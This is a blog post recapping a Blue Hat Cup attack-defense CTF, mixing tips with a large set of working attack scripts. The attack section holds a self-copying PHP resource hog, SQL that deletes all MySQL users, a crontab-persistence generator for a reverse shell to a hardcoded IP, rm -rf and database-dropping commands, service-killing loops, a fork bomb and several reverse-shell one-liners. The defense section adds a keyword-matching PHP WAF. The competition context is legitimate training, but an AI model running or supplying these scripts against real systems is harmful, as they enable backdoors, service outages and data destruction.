<!DOCTYPE html>
<html lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <link rel="stylesheet" href="/style/style.css">
<script>
  var nlviconfig = {
    title: "dyf",
    author: "dyf",
    baseUrl: "/",
    theme: {
      scheme: "banderole",
      lightbox: true,
      animate: true,
      search: true,
      friends: false,
      reward: false,
      lazy: false
    }
  }
</script>




    <link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">




    <link rel="stylesheet" href="/syuanpi/syuanpi.min.css">











<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="browsermode" content="application">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="dyf">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="msapplication-navbutton-color" content="#666666">
<meta name="format-detection" content="telephone=no">
<meta name="keywords" content="nlvi, Nlvi">





  <title> 蓝帽杯awd总结 · dyf </title>
</head>
<body>
  <div class="progress">
  <div class="progress-inner"></div>
</div>

  
    <div class="tagcloud-mask"></div>  
<div class="tagcloud" id="tagcloud">
  <div class="tagcloud-inner">
    <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
  </div>
</div>
  

  <div class="container" style="display:none;">

    <header class="header" id="header">
  <div class="header-wrapper">
    <div class="logo">
  <div class="logo-inner syuanpi tvIn">
    <span><a href="/">dyf</a></span>
    
  </div>
</div>
    <nav class="main-nav">
  
  <ul class="main-nav-list syuanpi tvIn">
  
    <li class="menu-item">
      <a href="javascript:;" id="search">
        <span>Search</span>
        
          <span class="menu-item-label">search</span>
        
      </a>
    </li>
  
  
    
      
    
    <li class="menu-item">
      <a href="/" id="article">
        <span class="base-name">Articles</span>
        
          <span class="menu-item-label">article</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/archives" id="archives">
        <span class="base-name">Archives</span>
        
          <span class="menu-item-label">archives</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="javascript:;" id="tags">
        <span class="base-name">Tags</span>
        
          <span class="menu-item-label">tags</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/about" id="about">
        <span class="base-name">About</span>
        
          <span class="menu-item-label">about</span>
        
      </a>
    </li>
  
  </ul>
  
</nav>

    
    
  </div>
</header>
<div class="mobile-header">
  <div class="mobile-header-body">
    <div class="mobile-header-list">
      
        
            <div class="mobile-nav-item">
                <a href="/">
                    <span>Articles</span>
                    
                    
                </a>
            </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/archives">
                    <span>Archives</span>
                    
                    
                </a>
            </div>
        
      
        
          <div class="mobile-nav-item inner-cloud">
            <div class="mobile-nav-tag">
              <a href="javascript:;" id="mobile-tags">
                <span>Tags</span>
                
                
              </a>
            </div>
            <div class="mobile-nav-tagcloud">
              <div class="mobile-tagcloud-inner">
                <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
              </div>
            </div>
          </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/about">
                    <span>About</span>
                    
                    
                </a>
            </div>
        
      
    </div>
  </div>
  <div class="mobile-header-nav">
    <div class="mobile-header-item" id="mobile-left">
      <div class="header-menu-item">
        <span class="header-menu-line"></span>
      </div>
    </div>
    <h1 class="mobile-header-title">
      <a href="/">dyf</a>
    </h1>
    <div class="mobile-header-item"></div>
  </div>
</div>
    <div class="container-inner">

    <h1 style="
    text-align:center;
    font-family:cathsgbr;
    color: #FC5185;
    font-weight:500;
    font-size:30px;
    ">The dyf's blog</h1>

      <main class="main" id="main">
        <div class="main-wrapper">
          
    
  


  <article class="
  post
   is_post 
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-08-23</span>
          
          
            
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          蓝帽杯awd总结
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        <p>&emsp;&emsp;最近沉迷于学习verilog以及计算机底层的相关知识,已经很久没有搞安全了.突然有机会打一场向往已久的AWD令我很是期待.终于我和朴淳 国峰 兴致冲冲的来到了国家会议中心,好生气派.</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat1.jpg?raw=true" alt="blue_hat1"></p>
<p>&emsp;&emsp;下午比赛刚开始,所有服务器直接宕机…不得不说奇安信这个做的不好.过了很久之后修好了,然后我们直接就被打懵了.一直疯狂掉分,直到挂上waf才稍有好转.总结一下学到的一点经验:  </p>
<h3 id="关于进攻"><a href="#关于进攻" class="headerlink" title="关于进攻"></a>关于进攻</h3><hr>
<p>&emsp;&emsp;反正这一次一下攻击都没有打,全程做防御.因为根本来不及代码审计,赛后问了一下对面的大佬怎么打的,他们说是thinkphp的cve,他们也就找到一个洞,然后就进了前十…可见赛前资料的准备有多么重要.另外就后门而言,见到了好几个特别骚的木马,当然不死马是最基础的,其实不死马能起作用主要是因为目录权限配置的有问题,主目录直接给了777肯定会被日啊.普通目录尽量别给写的权限.</p>
<p>&emsp;&emsp;还有一种马是base64加密马,然后添加crontab来写一句话木马.妈的这个是真的难受,我只能写shell一直删,还有就是一定要搅屎.我们有个nginx服务直接被删掉了,我都没发现有这个目录…然后服务一down开始疯狂掉分,我只好去偷别人的静态网页,诶,心里苦.  </p>
<p>&emsp;&emsp;关于搅屎,我痛定思痛,写了好几个搅屎棍:</p>
<ul>
<li>无限复制:  </li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(randstr().<span class="string">'.php'</span>,file_get_content(<span class="keyword">__FILE__</span>));</span><br><span class="line">        file_get_contents(<span class="string">"http://127.0.0.1/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>连名都是随机的,疯狂占资源,算是ddos吧  </p>
</blockquote>
<ul>
<li>改数据库密码:  </li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string=<span class="keyword">PASSWORD</span>(<span class="string">'p4rr0t'</span>);<span class="comment"># 修改所有用户密码</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> mysql.user <span class="keyword">SET</span> <span class="keyword">User</span>=<span class="string">'aaaaaaaaaaaa'</span> <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span>; </span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.user ;<span class="comment">#删除所有用户</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当时比赛的时候没想起来…</p>
<ul>
<li>各种crontab骚东西:  </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_reverse</span><span class="params">(reverse_ip, reverse_port)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    cmd = <span class="string">'bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1'</span> % (reverse_ip, reverse_port)</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * bash -c '%s'\n"</span> % cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp_rev.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_rm</span><span class="params">(rm_paths=<span class="string">'/var/www/html/'</span>)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    cmd = <span class="string">'/bin/rm -rf %s'</span> % rm_paths</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * %s\n"</span> % cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp_rm.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_flag_submit</span><span class="params">(flag_server, flag_port, flag_api, flag_token,</span></span></span><br><span class="line"><span class="function"><span class="params">                        flag_host)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">'/tmp'</span></span><br><span class="line">    cmd = <span class="string">'/usr/bin/curl "http://%s:%s/%s" -d "token=%s&amp;flag=$(curl %s)" '</span> % (</span><br><span class="line">        flag_server, flag_port, flag_api, flag_token, flag_host)</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * %s\n"</span> % cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp_submit.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  cmd = crontab_flag_submit(flag_server='0.0.0.0',</span></span><br><span class="line">                          <span class="comment">#  flag_port='8888',</span></span><br><span class="line">                          <span class="comment">#  flag_api='submit',</span></span><br><span class="line">                          <span class="comment">#  flag_token='bcbe3365e6ac95ea2c0343a2395834dd',</span></span><br><span class="line">                          <span class="comment">#  flag_host='http://192.168.100.1/Getkey')</span></span><br><span class="line"><span class="comment">#  print(cmd)</span></span><br><span class="line"></span><br><span class="line">cmd = crontab_reverse(<span class="string">'202.204.62.222'</span>,<span class="number">6666</span>)</span><br><span class="line">print(cmd)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个应该算是最牛逼的马了,waf基本挡不住,杀也杀不死.  </p>
<ul>
<li>疯狂日apache2和nigix:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line"><span class="keyword">while</span> [[ 1 ]]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    service apache2 stop</span><br><span class="line">    service nginx stop</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;杀不死基本凉凉,服务down扣分贼严重,</p>
<ul>
<li>删东西:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getfiles</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(glob($path) <span class="keyword">as</span> $afile)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir($afile))</span><br><span class="line">                getfiles($afile.<span class="string">'/*.php'</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                @file_put_contents($afile,<span class="string">"#Anything#"</span>);</span><br><span class="line">                <span class="comment">//unlink($afile);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        getfiles(<span class="keyword">__DIR__</span>);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    array_map(<span class="string">'unlink'</span>, glob(<span class="string">"some/dir/*.php"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;不说了,心里痛…qaq  </p>
<ul>
<li>删库跑路:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm_db</span><span class="params">(db_user,my_db_passwd)</span>:</span></span><br><span class="line">    cmd = <span class="string">"/usr/bin/mysql -h localhost -u%s %s -e '"</span>%(db_user,my_db_passwd)</span><br><span class="line">    db_name = [<span class="string">'performance_schema'</span>,<span class="string">'mysql'</span>,<span class="string">'flag'</span>]</span><br><span class="line">    <span class="keyword">for</span> db <span class="keyword">in</span> db_name:</span><br><span class="line">        cmd += <span class="string">"drop database %s;"</span>%db</span><br><span class="line">    cmd += <span class="string">"'"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个应该也是杀伤力极强,基本不会有人备份库子…</p>
<ul>
<li>fork_bomb  </li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/<span class="built_in">echo</span> <span class="string">'.() &#123; .|.&amp; &#125; &amp;&amp; .'</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这东西不及时发现就凉了,磁盘一会就爆了</p>
<ul>
<li>反弹后门技巧</li>
</ul>
<blockquote>
<p>shell</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1.3.3.7 4444</span><br><span class="line">bash -c <span class="string">'bash -i &gt;/dev/tcp/1.3.3.7/4444 0&gt;&amp;1'</span></span><br><span class="line">zsh -c <span class="string">'zmodload zsh/net/tcp &amp;&amp; ztcp 1.3.3.7 4444 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY'</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444</span><br></pre></td></tr></table></figure>
<blockquote>
<p>python</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>windows</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e /bin/bash <span class="number">1.3</span>.<span class="number">3.7</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;看到这么多罪恶的脚本心里好受了许多</p>
<blockquote>
<p>一定要记得流量混淆,瞎鸡儿发一下垃圾包假装连一句话混淆视听</p>
</blockquote>
<h3 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h3><hr>
<p>&emsp;&emsp;防御是真的难,但也基本就一下几点:</p>
<ol>
<li><p>日志</p>
<ul>
<li>/var/log/apache2/access.log</li>
<li>/var/log/apache2/error.log</li>
<li>/var/log/nginx/access.log</li>
<li>/var/log/nginx/error.log</li>
</ul>
</li>
<li><p>要快速弄清楚服务的目录,做好备份!!!!!!!</p>
<ul>
<li>去看/etc/apache2/ports.conf和/etc/apache2/sites-available/000-default.conf,快速找到目录和对应端口</li>
<li>去/etc/nginx/ 基本差不多</li>
<li>不做备份哭鸡鸡</li>
</ul>
</li>
<li><p>配置目录权限,尽量不要给777</p>
</li>
<li><p>挂waf,但是框架挂waf有些困难,我得再研究一下挂在哪里比较合适,盲猜得挂路由…</p>
<ul>
<li>这是我魔改的蜜罐,过滤了crontab和base64,我真是怕了…</li>
<li>需要注意的是,最好建一个log目录然后给777,最好不要直接把log写在当前目录下</li>
</ul>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">'LOG_FILENAME'</span>, <span class="string">'log.txt'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!function_exists(<span class="string">'getallheaders'</span>)) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">if</span> (substr($name, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">'HTTP_'</span>) $headers[str_replace(<span class="string">' '</span>, <span class="string">'-'</span>, ucwords(strtolower(str_replace(<span class="string">'_'</span>, <span class="string">' '</span>, substr($name, <span class="number">5</span>))))) ] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $headers;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $get = $_GET;</span><br><span class="line">    $post = $_POST;</span><br><span class="line">    $cookie = $_COOKIE;</span><br><span class="line">    $header = getallheaders();</span><br><span class="line">    $files = $_FILES;</span><br><span class="line">    $ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">    $method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];</span><br><span class="line">    $filepath = $_SERVER[<span class="string">"SCRIPT_NAME"</span>];</span><br><span class="line">    <span class="comment">//rewirte shell which uploaded by others, you can do more</span></span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $files[$key][<span class="string">'content'</span>] = file_get_contents($_FILES[$key][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        file_put_contents($_FILES[$key][<span class="string">'tmp_name'</span>], <span class="string">"virink"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]); <span class="comment">//fix a bug</span></span><br><span class="line">    $input = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"Get"</span> =&gt; $get,</span><br><span class="line">        <span class="string">"Post"</span> =&gt; $post,</span><br><span class="line">        <span class="string">"Cookie"</span> =&gt; $cookie,</span><br><span class="line">        <span class="string">"File"</span> =&gt; $files,</span><br><span class="line">        <span class="string">"Header"</span> =&gt; $header</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//deal with</span></span><br><span class="line">    $pattern = <span class="string">"select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span>;</span><br><span class="line">    $pattern.= <span class="string">"|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64"</span>;</span><br><span class="line">    $pattern.= <span class="string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span>;</span><br><span class="line">    $pattern.= <span class="string">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span>;</span><br><span class="line">    $vpattern = explode(<span class="string">"|"</span>, $pattern);</span><br><span class="line">    $bool = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($vpattern <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($v <span class="keyword">as</span> $kk =&gt; $vv) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">"/$value/i"</span>, $vv)) &#123;</span><br><span class="line">                    $bool = <span class="keyword">true</span>;</span><br><span class="line">                    logging($input);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($bool) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($bool) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">    file_put_contents(LOG_FILENAME, <span class="string">"\r\n"</span> . time() . <span class="string">"\r\n"</span> . print_r($var, <span class="keyword">true</span>) , FILE_APPEND);</span><br><span class="line">    <span class="comment">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span></span><br><span class="line">&#125;</span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li><p>写shell监视文件变化</p>
</li>
<li><p>不死马删除</p>
<ul>
<li>杀死www-data的进程,然后新建一个同名的文件</li>
<li>crontab马…只能写shell了,或者用php脚本删除crontab</li>
</ul>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sh</span></span><br><span class="line">ps -aux|grep <span class="string">'www-data'</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><hr>
<p>&emsp;&emsp;其实awd不在于漏洞多,在于cve的利用和搅屎,有一段时间我们没有掉分结果排名十分靠前,说明能进攻的队基本没几个,所以在准备不周的情况下做好防御就行了.<br>&emsp;&emsp;然后就是赛后一定要多尝试,要去熟悉主流框架的cve比如thinkphp laravel之类的.真正比赛的时候根本来不及仔细看哪些是后门,也没时间代码审计,全靠手感和经验.</p>
<h4 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h4><hr>
<p>&emsp;&emsp;这是我写的awd攻击框架(虽然没用上…),能批量shell执行,很舒服.欢迎体验<a href="https://github.com/Explainaur/P4rr0t_shell" target="_blank" rel="noopener">parrot_shell</a></p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat2.jpg?raw=true" alt="parrot"></p>
<p>&emsp;&emsp;最后来一张队友合照,嘿嘿404 forever</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat3.jpg?raw=true" alt="404"></p>

      
    
    </div>
    
      

      
  <hr class="copy-line">
  <div class="post-copyright">
    <div class="copy-author">
      <span>Author :</span>
      <span>dyf</span>
    </div>
    <div class="copy-url">
      <span>Url :</span>
      <a href="http://blog.dyf.ink/2019/08/23/蓝帽杯awd总结/">http://blog.dyf.ink/2019/08/23/蓝帽杯awd总结/</a>
    </div>
    <div class="copy-origin">
      <span>Origin :</span>
      <a href="http://blog.dyf.ink">http://blog.dyf.ink</a>
    </div>
    <div class="copy-license">
      
      著作权归作者所有，转载请联系作者获得授权。
    </div>
  </div>

    
  </article>
  
    
  <nav class="article-page">
    
      <a href="/2019/09/15/web知识点记录/" id="art-left" class="art-left">
        <span class="next-title">
          <i class="iconfont icon-left"></i>web知识点记录
        </span>
      </a>
    
    
      <a href="/2019/06/03/adworld-pwn部分writeUp/" id="art-right" class="art-right">
        <span class="prev-title"> 
          adworld_pwn部分writeUp<i class="iconfont icon-right"></i>  
        </span>
      </a>
    
  </nav>

    
  <i id="com-switch" class="iconfont icon-more jumping-in long infinite" style="font-size:24px;display:block;text-align:center;transform:rotate(180deg);"></i>
  <div class="post-comments" id="post-comments" style="display: block;margin: auto 16px;">
    
    
    

    

  </div>



  
  
    
  

  <aside class="post-toc">
    <span class="title" id="toc-switch"><span>Index</span></span>
    <div class="toc-inner syuanpi back-1" style="display:none;">
      <li class="title-link"><a href="javascript:;" class="toTop">蓝帽杯awd总结</a></li>
